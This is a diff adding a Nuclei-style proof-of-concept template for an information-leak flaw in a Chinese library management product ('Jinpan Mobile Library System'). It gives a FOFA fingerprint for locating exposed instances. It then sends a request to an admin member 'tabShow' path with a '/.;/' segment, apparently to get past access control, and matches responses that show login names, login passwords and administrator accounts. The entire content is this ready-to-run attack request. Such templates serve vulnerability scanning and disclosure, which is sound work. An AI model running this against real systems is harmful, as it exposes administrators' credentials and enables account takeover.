@@ -1,0 +1,40 @@
+id: poc-yaml-jinpan-mls-tabshow-info-leak
+
+info:
+  name: "金盘移动图书馆系统 tabShow 信息泄露漏洞"
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: 信息泄露
+  metadata:
+    finger: "金盘移动图书馆系统"
+    fofa: "icon_hash=\"89337953\""
+
+http:
+  - raw:
+      - |
+        GET /opac/search/simsearch HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "北京金盘鹏图软件技术有限公司"
+
+  - raw:
+      - |
+        GET /.;/admin/auth/member/1/tabShow HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "用户信息"
+          - "登录名"
+          - "登录密码"
+          - "系统管理员"
